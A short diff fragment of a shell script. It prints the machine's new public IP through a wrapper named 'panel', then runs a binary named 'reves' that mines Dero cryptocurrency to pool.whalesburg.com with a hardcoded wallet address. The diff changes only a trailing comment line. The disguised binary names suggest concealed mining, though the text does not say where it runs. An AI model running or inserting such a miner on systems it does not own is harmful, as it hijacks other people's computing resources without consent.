@@ -20,4 +20,4 @@ echo " "
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
 ./panel ./reves -r pool.whalesburg.com:4300 -w dero1qyc95cuufup67sf6kykepuhtnps3g2xxkgxrq2c7h4rm0z7esz0p2qqqawa77.gas
-#
+
